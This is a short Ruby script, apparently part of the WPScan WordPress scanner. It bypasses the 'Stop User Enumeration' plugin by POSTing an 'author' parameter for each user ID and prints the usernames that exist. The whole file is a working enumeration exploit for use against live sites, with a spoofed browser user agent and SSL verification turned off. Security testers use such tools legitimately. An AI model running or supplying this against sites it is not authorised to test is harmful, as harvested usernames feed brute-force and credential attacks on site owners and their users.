#!/usr/bin/env ruby
# encoding: UTF-8
#
#
# Script based on http://seclists.org/fulldisclosure/2014/Feb/3

require File.join(__dir__, 'lib', 'wpscan', 'wpscan_helper')

@opts = {
  ids: 1..10,
  verbose: false,
  user_agent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0'
}

parser = OptionParser.new('Usage: ./stop_user_enumeration_bypass.rb <Target URL> [options]', 35) do |opts|
  opts.on('--proxy PROXY', 'Proxy to use') do |proxy|
    @opts[:proxy] = proxy
  end

  opts.on('--auth Username:Password', 'Credentials to use if Basic/NTLM auth') do |creds|
    @opts[:creds] = creds
  end

  opts.on('--ids START-END', 'The ids to check, default is 1-10') do |ids|
    @opts[:ids] = Range.new(*ids.split('-').map(&:to_i))
  end

  opts.on('--user-agent UA', 'The user-agent to use') do |ua|
    @opts[:user_agent] = ua
  end

  opts.on('--verbose', '-v', 'Verbose Mode') do
    @opts[:verbose] = true
  end
end

begin
  parser.parse!

  fail "#{critical('The target URL must be supplied')}\n\n#{parser}" unless ARGV[0]

  uri = URI.parse(add_trailing_slash(add_http_protocol(ARGV[0]))).to_s

  request_params = {
    proxy: @opts[:proxy],
    userpwd: @opts[:creds],
    headers: { 'User-Agent' => @opts[:user_agent] },
    followlocation: true,
    ssl_verifypeer: false,
    ssl_verifyhost: 2
  }

  detected_users = WpUsers.new

  @opts[:ids].each do |user_id|
    user = WpUser.new(uri, id: user_id)

    if user.exists_from_response?(
      Typhoeus.post(uri, request_params.merge(body: { author: user_id }))
    )
      detected_users << user
    end
  end

  puts 'Usernames found:'
  detected_users.output
rescue => e
  puts e.message

  if @opts[:verbose]
    puts critical('Trace:')
    puts critical(e.backtrace.join("\n"))
  end
  exit(1)
end
